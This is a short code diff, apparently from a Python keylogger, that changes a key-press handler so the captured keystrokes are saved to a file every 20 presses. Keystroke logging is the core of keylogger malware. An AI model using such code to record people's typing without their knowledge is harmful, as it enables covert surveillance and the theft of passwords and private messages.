@@ -12,7 +12,11 @@ def on_press(key):
     keys.append(key)
     count += 1
     print("{0} pressed".format(key))
-    
+
+    if count >= 20:
+        count = 0
+        write_file(keys)
+        keys = []
 
 
 def on_release(key):
